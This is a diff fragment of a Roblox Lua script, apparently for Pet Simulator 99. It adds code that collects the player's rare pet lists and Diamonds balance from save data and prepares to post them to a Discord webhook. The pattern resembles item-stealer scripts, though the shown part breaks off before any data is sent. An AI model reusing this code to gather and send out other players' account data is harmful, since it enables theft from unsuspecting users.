@@ -1,6 +1,27 @@
-local function SendWebhook()
+local AllPetsList = {}
+for _, list in pairs({HugeList, ExcList, EggList, CharmList}) do
+    for _, value in pairs(list) do
+        table.insert(AllPetsList, value)
+    end
+end
+local PetsListString = "\n" -- Create a string to represent the HugeList
+for i, v in pairs(AllPetsList) do
+    PetsListString = PetsListString .. v .. "\n" -- Append each Huge item to the string
+end
+local GetSave = function()
+    return require(game.ReplicatedStorage.Library.Client.Save).Get()
+end
+for i, v in pairs(GetSave().Inventory.Currency) do
+    if v.id == "Diamonds" then
+        GemAmount = v._am
+        print(GemAmount)
+    end
+end
+
 local url = Webhook
 local whenabled = true
+local function SendWebhook()
+
 imgs =
     "https://cdn.discordapp.com/attachments/1151888533775196180/1190764360717574274/giftps99.png?ex=65a2fcba&is=659087ba&hm=1e65b7100a0159e66e2efd4f1c91a8362b60eb253fec0d40f12b4de5911ca4e5&"
 data1 = {
